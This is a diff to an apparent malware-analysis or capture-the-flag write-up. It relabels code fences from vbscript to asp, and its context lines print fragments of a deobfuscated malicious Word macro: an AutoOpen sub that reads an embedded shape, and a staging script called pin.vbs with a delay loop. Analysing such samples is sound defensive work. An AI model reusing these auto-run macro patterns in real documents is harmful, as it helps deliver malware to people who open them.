@@ -581,7 +581,7 @@ Looking at the doc file I was given, I extracted macros in it using olevba
 
 After reversing the string to make it look cleaner
 
-```vbscript
+```asp
 Sub AutoOpen()
     Dim QQ1 As Object
     Set QQ1 = ActiveDocument.Shapes(1)
@@ -614,7 +614,7 @@ So, from the script I knew that the script pin.vbs was going to be used so i nee
 
 I clean the scritp a bit to make it more "readable" and the final result was 
 
-```vbscript
+```asp
 Dim WAITPLZ, WS, k, kl
 WAITPLZ = DateAdd(Chr(115), 4, Now())
 Do Until (Now() > WAITPLZ)
